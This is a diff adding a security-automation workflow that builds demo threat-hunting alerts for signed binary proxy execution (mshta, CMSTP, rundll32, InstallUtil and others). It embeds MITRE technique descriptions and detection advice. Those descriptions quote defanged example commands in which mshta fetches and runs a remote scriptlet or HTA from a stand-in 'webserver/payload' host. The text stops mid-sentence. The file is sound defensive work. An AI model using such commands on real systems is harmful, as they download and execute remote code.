@@ -1,0 +1,336 @@
+{
+    "@type": "Workflow",
+    "triggerLimit": null,
+    "name": "Generates Alerts for Signed Binary Proxy Execution",
+    "aliasName": null,
+    "tag": null,
+    "description": "Demonstrates threat hunting scenario for the attacks using MITRE technique Signed Binary Proxy Execution [T1218] and generates demo Hunt, Alert and Technique\/Sub-Technique records for the same",
+    "isActive": true,
+    "debug": false,
+    "singleRecordExecution": false,
+    "remoteExecutableFlag": false,
+    "parameters": [],
+    "synchronous": false,
+    "lastModifyDate": 1644165542,
+    "collection": "\/api\/3\/workflow_collections\/c926f317-8aba-41c5-8f71-2f0f23d992fb",
+    "versions": [],
+    "triggerStep": "\/api\/3\/workflow_steps\/6aa23f61-e8cd-4bcf-867e-3443905cf4fd",
+    "steps": [
+        {
+            "@type": "WorkflowStep",
+            "name": "Start",
+            "description": null,
+            "arguments": {
+                "step_variables": {
+                    "input": {
+                        "params": []
+                    }
+                }
+            },
+            "status": null,
+            "top": "30",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/b348f017-9a94-471f-87f8-ce88b6a7ad62",
+            "uuid": "6aa23f61-e8cd-4bcf-867e-3443905cf4fd",
+            "id": 4739
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Configuration",
+            "description": null,
+            "arguments": {
+                "scenarioTitle": "{{vars.input.records[0].title}}",
+                "useMockOutput": "{{globalVars.Demo_mode}}"
+            },
+            "status": null,
+            "top": "165",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/04d0cf46-b6a8-42c4-8683-60a7eaa69e8f",
+            "uuid": "9ccbca61-ccd5-44ee-9d46-a31e196d8bb3",
+            "id": 4740
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Alert from SIEM",
+            "description": null,
+            "arguments": {
+                "arguments": {
+                    "huntEnd": "{{arrow.get(vars.steps.Get_Hunt_Time_Range.input.huntEndDate).int_timestamp}}",
+                    "huntStart": "{{arrow.get(vars.steps.Get_Hunt_Time_Range.input.huntStartDate).int_timestamp}}"
+                },
+                "apply_async": false,
+                "step_variables": [],
+                "workflowReference": "\/api\/3\/workflows\/2f92c737-3836-4b06-bef9-86aee19f2f59"
+            },
+            "status": null,
+            "top": "570",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/74932bdc-b8b6-4d24-88c4-1a4dfbc524f3",
+            "uuid": "051668a8-445e-4117-bbad-e2c5c3d5e632",
+            "id": 4741
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Created Alert Data",
+            "description": null,
+            "arguments": {
+                "@id": "{{((vars.steps.Create_and_Link_Alert | json_query('[].alert_data.\"@id\"')) | union([vars.steps.Create_Hunt_Record['@id']]) | union(vars.steps.Create_and_Link_Alert | json_query('[].technique_data'))) | flatten(levels=1) }}"
+            },
+            "status": null,
+            "top": "840",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/04d0cf46-b6a8-42c4-8683-60a7eaa69e8f",
+            "uuid": "e403123e-64a2-4c04-aaa2-7808391edb03",
+            "id": 4742
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Get Hunt Time Range",
+            "description": null,
+            "arguments": {
+                "type": "InputBased",
+                "input": {
+                    "schema": {
+                        "title": "Enter Hunt Time Range",
+                        "description": "Hunt Time Range",
+                        "inputVariables": [
+                            {
+                                "name": "huntStartDate",
+                                "type": "integer",
+                                "label": "Hunt Start Date",
+                                "title": "Date\/Time Field",
+                                "usable": true,
+                                "tooltip": "",
+                                "dataType": "datetime",
+                                "formType": "datetime",
+                                "required": true,
+                                "_expanded": true,
+                                "mmdUpdate": true,
+                                "collection": false,
+                                "searchable": true,
+                                "templateUrl": "app\/components\/form\/fields\/datetime.html",
+                                "defaultValue": {
+                                    "differenceType": "months",
+                                    "differenceValue": -1
+                                },
+                                "_previousName": "untStartDate",
+                                "lengthConstraint": false,
+                                "allowedEncryption": false,
+                                "allowedGridColumn": true,
+                                "useRecordFieldDefault": false
+                            },
+                            {
+                                "name": "huntEndDate",
+                                "type": "integer",
+                                "label": "Hunt End Date",
+                                "title": "Date\/Time Field",
+                                "usable": true,
+                                "tooltip": "",
+                                "dataType": "datetime",
+                                "formType": "datetime",
+                                "required": true,
+                                "_expanded": true,
+                                "mmdUpdate": true,
+                                "collection": false,
+                                "searchable": true,
+                                "templateUrl": "app\/components\/form\/fields\/datetime.html",
+                                "defaultValue": {
+                                    "differenceType": "mins",
+                                    "differenceValue": 1
+                                },
+                                "_previousName": "huntStartDate",
+                                "lengthConstraint": false,
+                                "allowedEncryption": false,
+                                "allowedGridColumn": true,
+                                "useRecordFieldDefault": false
+                            }
+                        ]
+                    }
+                },
+                "record": "{{vars.input.records[0]['@id']}}",
+                "resources": "scenario",
+                "owner_detail": {
+                    "isAssigned": false
+                },
+                "step_variables": [],
+                "response_mapping": {
+                    "options": [
+                        {
+                            "option": "Submit",
+                            "primary": true,
+                            "step_iri": "\/api\/3\/workflow_steps\/d5dfe07c-f80d-415f-80f1-13e15734a0d8"
+                        }
+                    ],
+                    "duplicateOption": false
+                },
+                "email_notification": {
+                    "enabled": false,
+                    "smtpParameters": []
+                }
+            },
+            "status": null,
+            "top": "300",
+            "left": "125",
+            "stepType": "\/api\/3\/workflow_step_types\/fc04082a-d7dc-4299-96fb-6837b1baa0fe",
+            "uuid": "1d63b989-eae0-4a8d-b5c2-0c1bf064faa6",
+            "id": 4743
+        },
+        {
+            "@type": "WorkflowStep",
+            "name": "Create and Link Alert",
+            "description": null,
+            "arguments": {
+                "for_each": {
+                    "item": "{{vars.steps.Get_Alert_from_SIEM.step_output}}",
+                    "parallel": false,
+                    "condition": ""
+                },
+                "arguments": {
+                    "MD5": "{{ (vars.item._source.event_data.Hashes.split(\"MD5=\")[1].split(',')[0])}}",
+                    "url": "",
+                    "source": "{{vars.item._source.source_name}}",
+                    "comment": "{% if 'cmstp' in vars.item._index %}SIEM query identified CMSTP.exe spawning potentially non-standard child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }}  on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'compiledhtml' in vars.item._index %}SIEM query identified a Compiled HTML file spawning child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'controlpanelitems' in vars.item._index %}SIEM query identified control.exe spawning potentially non-standard child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'mshta' in vars.item._index and 'mshta' in vars.item._source.image_path %}SIEM query identified MSHTA.exe was invoked on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'mshta' in vars.item._index and 'cmd' in vars.item._source.image_path %}SIEM query identified MSHTA.exe spawned child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'rundll32' in vars.item._index %}SIEM query identified rundll32.exe spawned child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} from a nonstandard directory on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'regsvcregasm' in vars.item._index %}SIEM query identified regsvcs.exe or regasm.exe spawned child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'installutil' in vars.item._index %}SIEM query identified InstallUtil.exe was executed via command line on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% endif %}",
+                    "huntIRI": "{{vars.steps.Create_Hunt_Record['@id']}}",
+                    "service": "",
+                    "filePath": "{{vars.item._source.image_path}}",
+                    "hostName": "{{vars.item._source.beat.hostname}}",
+                    "sourceIP": "",
+                    "userName": "{{vars.item._source.username}}",
+                    "alertName": "{% if 'cmstp' in vars.item._index %}ATT&CK-CMSTP-{{vars.item._source.image_path.split(\"\\\\\")[-1]}} spawned{% elif 'compiledhtml' in vars.item._index %}ATT&CK-Compiled HTML-{{vars.item._source.image_path.split(\"\\\\\")[-1]}} spawned{% elif 'controlpanelitems' in vars.item._index %}ATT&CK-Control Panel Items-{{vars.item._source.image_path.split(\"\\\\\")[-1]}} spawned by control.exe{% elif 'mshta' in vars.item._index and 'mshta' in vars.item._source.image_path %}ATT&CK-Mshta-{{vars.item._source.image_path.split(\"\\\\\")[-1] }} executed{% elif 'mshta' in vars.item._index and 'cmd' in vars.item._source.image_path %}ATT&CK-Mshta-{{vars.item._source.image_path.split(\"\\\\\")[-1] }} spawned{% elif 'rundll32' in vars.item._index %}ATT&CK-Rundll32-{{vars.item._source.image_path.split(\"\\\\\")[-1] }} executed by Rundll32.exe{% elif 'regsvcregasm' in vars.item._index %}ATT&CK-Regsvcs\/Regasm-{{vars.item._source.image_path.split(\"\\\\\")[-1] }} spawned{% elif 'installutil' in vars.item._index %}ATT&CK-InstallUtil-Command line with InstallUtil detected{% endif %}",
+                    "alertType": "{{\"AlertType\" | picklist(\"Signed Binary Proxy Execution\", \"@id\")}}",
+                    "epochTime": "{{ arrow.get(vars.item._source.event_data.UtcTime).timestamp }}",
+                    "eventName": "",
+                    "eventTime": "{{ vars.item._source.event_data.UtcTime}}",
+                    "processID": "{{vars.item._source.event_data.ProcessId}}",
+                    "technique": "{% if 'cmstp' in vars.item._index %}CMSTP{% elif 'compiledhtml' in vars.item._index %}Compiled HTML{% elif 'controlpanelitems' in vars.item._index %}Control Panel Items{% elif 'mshta' in vars.item._index and 'mshta' in vars.item._source.image_path %}MSHTA{% elif 'mshta' in vars.item._index and 'cmd' in vars.item._source.image_path %}MSHTA-Child{% elif 'rundll32' in vars.item._index %}Rundll32{% elif 'regsvcregasm' in vars.item._index %}Regsvcs\/Regasm{% elif 'installutil' in vars.item._index %}InstallUtil-Commandline{% endif %}",
+                    "sourceData": "{{vars.item}}",
+                    "sourceTool": "{{vars.item._source.source_name}}",
+                    "commandline": "{{vars.item._source.event_data.CommandLine}}",
+                    "description": "{% if 'cmstp' in vars.item._index %}An attempt to invoke cmstp.exe was observed. CMSTP has been used to load malicious .inf files, enabling an attacker to force a host to download and execute DLLs or SCT files from a remote server. In many networks, an instance of a host executing cmstp.exe is uncommon and should investigated for additional signs of compromise.{% elif 'compiledhtml' in vars.item._index %}An attempt by hh.exe to spawn a process was observed. Hh.exe can be used to execute compiled HTML (.chm) files. An adversary could craft a custom malicious .chm file and trick a user into executing it, potentially infecting the host. Any process spawned by hh.exe should be analyzed for malicious activity.{% elif 'controlpanelitems' in vars.item._index %}An attempt to invoke control.exe was observed. Control.exe is used to execute Control Panel Items. Control Panel Items are either executables (.exe files) or Control Panel files (.cpl files, which are just DLLs that use the .cpl extension instead of \".dll\"). In most organizations, it is unusual for these files to be manually executed, so the file executed and this host should be investigated for further suspicious activity.{% elif 'mshta' in vars.item._index and 'mshta' in vars.item._source.image_path %}An attempt to invoke mshta.exe was observed. MSHTA can be used as an alternate method of executing local and remotely hosted executables. In most networks execution of MSHTA.exe is an uncommon occurrence and should be investigated as a potential sign of compromise.{% elif 'mshta' in vars.item._index and 'cmd' in vars.item._source.image_path %}SIEM query identified MSHTA.exe spawned child process {{vars.item._source.image_path.split(\"\\\\\")[-1] }} on {{vars.item._source.beat.hostname}} at {{vars.item._source.event_data.UtcTime}}.{% elif 'rundll32' in vars.item._index %}An attempt to invoke Rundll32.exe was observed. Rundll32 can be used to load arbitrary DLL files. Use of this technique may bypass application whitelisting and allow an attacker to bypass other defenses. Attention should be paid to the commands passed to Rundll32 as well as processes spawned.{% elif 'regsvcregasm' in vars.item._index %}An instance of Regsvcs.exe or Regasm.exe spawning a child process was observed. Regsvcs.exe and Regasm.exe are signed by Microsoft and can be used to execute arbitrary code.  As such, they may be used by an adversary to execute malicious code. Command line arguments and child processes spawned by Regsvcs.exe or Regasm.exe should be examined for malicious content.{% elif 'installutil' in vars.item._index %}An attempt to invoke installutil.exe via command line was observed. InstallUtil.exe is digitally signed by Microsoft and can be used to execute a malicious binary on a host while bypassing processes whitelisting. Special attention should be paid to command line arguments passed with the InstallUtil.exe command and any child processes of InstallUtil.exe.{% endif %}",
+                    "processGUID": "{{vars.item._source.event_data.ProcessGuid}}",
+                    "processName": "{{vars.item._source.image_path.split(\"\\\\\")[-1] }}",
+                    "registryKey": "",
+                    "sourceImage": "{{ vars.item._source.event_data.SourceImage | replace( \"\\\\\", \"\\\\\\\\\" )}}",
+                    "targetImage": "{{ vars.item._source.event_data.TargetImage | replace( \"\\\\\", \"\\\\\\\\\" )}}",
+                    "computerName": "{{vars.item._source.computer_name}}",
+                    "destinationIP": "",
+                    "mitre_tech_id": "{% if 'cmstp' in vars.item._index %}T1218.003{% elif 'compiledhtml' in vars.item._index %}T1218.001{% elif 'controlpanelitems' in vars.item._index %}T1218.002{% elif 'mshta' in vars.item._index and 'mshta' in vars.item._source.image_path %}T1218.005{% elif 'mshta' in vars.item._index and 'cmd' in vars.item._source.image_path %}T1218.005{% elif 'regsvcregasm' in vars.item._index %}T1218.009{% elif 'rundll32' in vars.item._index %}T1218.011{% elif 'installutil' in vars.item._index %}T1218.004{% endif %}",
+                    "parentProcess": "{{vars.item._source.parent_image_path}}",
+                    "scheduledTask": "",
+                    "bitstransferid": "",
+                    "parentProcessID": "{{vars.item._source.event_data.ParentProcessId}}",
+                    "bytestransferred": "",
+                    "registryKeyValue": "",
+                    "parentCommandLine": "{{vars.item._source.event_data.ParentCommandLine}}",
+                    "decodedCommandLine": "",
+                    "mitreTechniqueData": "{% if 'cmstp' in vars.item._index %}{\n    \"id\": 229,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/4cbc6a62-9e34-4f94-8a19-5c1a11392a49\",\n    \"name\": \"CMSTP\",\n    \"uuid\": \"4cbc6a62-9e34-4f94-8a19-5c1a11392a49\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579804050,\n    \"mitreId\": \"T1218.003\",\n    \"myNotes\": null,\n    \"version\": \"1.0\",\n    \"detection\": \"Use process monitoring to detect and analyze the execution and arguments of CMSTP.exe. Compare recent invocations of CMSTP.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity.\\n\\nSysmon events can also be used to identify potential abuses of CMSTP.exe. Detection strategy may depend on the specific adversary procedure, but potential rules include: (Citation: Endurant CMSTP July 2018)\\n\\n* To detect loading and execution of local\/remote payloads - Event 1 (Process creation) where ParentImage contains CMSTP.exe and\/or Event 3 (Network connection) where Image contains CMSTP.exe and DestinationIP is external.\\n* To detect [Bypass User Account Control](https:\/\/attack.mitre.org\/techniques\/T1548\/002) via an auto-elevated COM interface - Event 10 (ProcessAccess) where CallTrace contains CMLUA.dll and\/or Event 12 or 13 (RegistryEvent) where TargetObject contains CMMGR32.exe. Also monitor for events, such as the creation of processes (Sysmon Event 1), that involve auto-elevated CMSTP COM interfaces such as CMSTPLUA (3E5FC7F9-9A51-4367-9063-A120244FBEC7) and CMLUAUTIL (3E000D72-A845-4CD9-BD83-80C07C3B881F).\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, Command: Command Execution, Network Traffic: Network Connection Creation\",\n    \"description\": \"Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.\\n\\nAdversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) Similar to [Regsvr32](https:\/\/attack.mitre.org\/techniques\/T1218\/010) \/ \u201dSquiblydoo\u201d, CMSTP.exe may be abused to load and execute DLLs (Citation: MSitPros CMSTP Aug 2017)  and\/or COM scriptlets (SCT) from remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.\\n\\nCMSTP.exe can also be abused to [Bypass User Account Control](https:\/\/attack.mitre.org\/techniques\/T1548\/002) and execute arbitrary commands from a malicious INF through an auto-elevated COM interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018)\",\n    \"lastModified\": 1603810179,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% elif 'compiledhtml' in vars.item._index %}{\n    \"id\": 351,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/a6937325-9321-4e2e-bb2b-3ed2d40b2a9d\",\n    \"name\": \"Compiled HTML File\",\n    \"uuid\": \"a6937325-9321-4e2e-bb2b-3ed2d40b2a9d\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579805634,\n    \"mitreId\": \"T1218.001\",\n    \"myNotes\": null,\n    \"version\": \"1.0\",\n    \"detection\": \"Monitor and analyze the execution and arguments of hh.exe. (Citation: MsitPros CHM Aug 2017) Compare recent invocations of hh.exe with prior history of known good arguments to determine anomalous and potentially adversarial activity (ex: obfuscated and\/or malicious commands). Non-standard process execution trees may also indicate suspicious or malicious behavior, such as if hh.exe is the parent process for suspicious processes and activity relating to other adversarial techniques.\\n\\nMonitor presence and use of CHM files, especially if they are not typically used within an environment.\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, File: File Creation, Command: Command Execution\",\n    \"description\": \"Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting\/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\\n\\nA custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https:\/\/attack.mitre.org\/techniques\/T1204). CHM execution may also bypass application application control on older and\/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)\",\n    \"lastModified\": 1619707779,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User\"\n  }{% elif 'controlpanelitems' in vars.item._index %}{\n    \"id\": 233,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/4ff5d6a8-c062-4c68-a778-36fc5edd564f\",\n    \"name\": \"Control Panel\",\n    \"uuid\": \"4ff5d6a8-c062-4c68-a778-36fc5edd564f\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579809592,\n    \"mitreId\": \"T1218.002\",\n    \"myNotes\": null,\n    \"version\": \"1.1\",\n    \"detection\": \"Monitor and analyze activity related to items associated with CPL files, such as the control.exe and the <code>Control_RunDLL<\/code> and <code>ControlRunDLLAsUser<\/code> API functions in shell32.dll. When executed from the command line or clicked, control.exe will execute the CPL file (ex: <code>control.exe file.cpl<\/code>) before [Rundll32](https:\/\/attack.mitre.org\/techniques\/T1218\/011) is used to call the CPL's API functions (ex: <code>rundll32.exe shell32.dll,Control_RunDLL file.cpl<\/code>). CPL files can be executed directly via the CPL API function with just the latter [Rundll32](https:\/\/attack.mitre.org\/techniques\/T1218\/011) command, which may bypass detections and\/or execution filters for control.exe.(Citation: TrendMicro CPL Malware Jan 2014)\\n\\nInventory Control Panel items to locate unregistered and potentially malicious files present on systems:\\n\\n* Executable format registered Control Panel items will have a globally unique identifier (GUID) and registration Registry entries in <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\ControlPanel\\\\NameSpace<\/code> and <code>HKEY_CLASSES_ROOT\\\\CLSID\\\\{GUID}<\/code>. These entries may contain information about the Control Panel item such as its display name, path to the local file, and the command executed when opened in the Control Panel. (Citation: Microsoft Implementing CPL)\\n* CPL format registered Control Panel items stored in the System32 directory are automatically shown in the Control Panel. Other Control Panel items will have registration entries in the <code>CPLs<\/code> and <code>Extended Properties<\/code> Registry keys of <code>HKEY_LOCAL_MACHINE or HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Control Panel<\/code>. These entries may include information such as a GUID, path to the local file, and a canonical name used to launch the file programmatically (<code> WinExec(\\\"c:\\\\windows\\\\system32\\\\control.exe {Canonical_Name}\\\", SW_NORMAL);<\/code>) or from a command line (<code>control.exe \/name {Canonical_Name}<\/code>).(Citation: Microsoft Implementing CPL)\\n* Some Control Panel items are extensible via Shell extensions registered in <code>HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Controls Folder\\\\{name}\\\\Shellex\\\\PropertySheetHandlers<\/code> where {name} is the predefined name of the system item.(Citation: Microsoft Implementing CPL)\\n\\nAnalyze new Control Panel items as well as those present on disk for malicious content. Both executable and CPL formats are compliant Portable Executable (PE) images and can be examined using traditional tools and methods, pending anti-reverse-engineering techniques.(Citation: TrendMicro CPL Malware Jan 2014)\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification\",\n    \"description\": \"Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.\\n\\nControl Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet<\/code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendMicro CPL Malware Jan 2014) For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel.(Citation: Microsoft Implementing CPL) Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.(Citation: Microsoft Implementing CPL) (Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013)\\n\\nMalicious Control Panel items can be delivered via [Phishing](https:\/\/attack.mitre.org\/techniques\/T1566) campaigns(Citation: TrendMicro CPL Malware Jan 2014)(Citation: TrendMicro CPL Malware Dec 2013) or executed as part of multi-stage malware.(Citation: Palo Alto Reaver Nov 2017) Control Panel items, specifically CPL files, may also bypass application and\/or file extension allow lists.\\n\\nAdversaries may also rename malicious DLL files (.dll) with Control Panel file extensions (.cpl) and register them to <code>HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Control Panel\\\\Cpls<\/code>. Even when these registered DLLs do not comply with the CPL file specification and do not export <code>CPlApplet<\/code> functions, they are loaded and executed through its <code>DllEntryPoint<\/code> when Control Panel is executed. CPL files not exporting <code>CPlApplet<\/code> are not directly executable.(Citation: ESET InvisiMole June 2020)\",\n    \"lastModified\": 1619707779,\n    \"parentTechnique\": {\n      \"id\": 143,\n      \"@id\": \"\/api\/3\/mitre_techniques\/457c7820-d331-465a-915e-42f85500ccc4\",\n      \"name\": \"Signed Binary Proxy Execution\",\n      \"uuid\": \"457c7820-d331-465a-915e-42f85500ccc4\",\n      \"@type\": \"Technique\",\n      \"notes\": null,\n      \"capecId\": null,\n      \"created\": 1524074364,\n      \"mitreId\": \"T1218\",\n      \"version\": \"2.1\",\n      \"detection\": \"Monitor processes and command-line parameters for signed binaries that may be used to proxy execution of malicious files. Compare recent invocations of signed binaries that may be used to proxy execution with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Legitimate programs used in suspicious ways, like msiexec.exe downloading an MSI file from the Internet, may be indicative of an intrusion. Correlate activity with other suspicious behavior to reduce false positives that may be due to normal benign use by users and administrators.\\n\\nMonitor for file activity (creations, downloads, modifications, etc.), especially for file types that are not typical within an environment and may be indicative of adversary activity.\",\n      \"platforms\": \"Windows\",\n      \"recordTags\": [],\n      \"dataSources\": \"Process: Process Creation, File: File Creation, Module: Module Load, Process: OS API Execution, Command: Command Execution, Windows Registry: Windows Registry Key Modification, Network Traffic: Network Connection Creation\",\n      \"description\": \"Adversaries may bypass process and\/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.\",\n      \"lastModified\": 1634343199,\n      \"permissionsRequired\": \"User, Administrator\"\n    },\n    \"permissionsRequired\": \"User, Administrator, SYSTEM\"\n  }{% elif 'mshta' in vars.item._index and 'mshta' in vars.item._source.image_path %}{\n    \"id\": 314,\n    \"@id\": \"\/api\/3\/mitre_sub_techniques\/840a987a-99bd-4a80-a5c9-0cb2baa6cade\",\n    \"name\": \"Mshta\",\n    \"uuid\": \"840a987a-99bd-4a80-a5c9-0cb2baa6cade\",\n    \"@type\": \"Subtechnique\",\n    \"capecId\": null,\n    \"created\": 1579807969,\n    \"mitreId\": \"T1218.005\",\n    \"myNotes\": null,\n    \"version\": \"1.1\",\n    \"detection\": \"Use process monitoring to monitor the execution and arguments of mshta.exe. Look for mshta.exe executing raw or obfuscated script within the command-line. Compare recent invocations of mshta.exe with prior history of known good arguments and executed .hta files to determine anomalous and potentially adversarial activity. Command arguments used before and after the mshta.exe invocation may also be useful in determining the origin and purpose of the .hta file being executed.\\n\\nMonitor use of HTA files. If they are not typically used within an environment then execution of them may be suspicious\",\n    \"platforms\": \"Windows\",\n    \"recordTags\": [],\n    \"dataSources\": \"Process: Process Creation, File: File Creation, Command: Command Execution, Network Traffic: Network Connection Creation\",\n    \"description\": \"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \\n\\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. (Citation: Wikipedia HTML Application) HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser. (Citation: MSDN HTML Applications)\\n\\nFiles may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(\\\"GetObject(\\\"\\\"script:https[:]\/\/webserver\/payload[.]sct\\\"\\\")\\\"))<\/code>\\n\\nThey may also be executed directly from URLs: <code>mshta http[:]\/\/webserver\/payload[.]hta<\/code>\\n\\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since 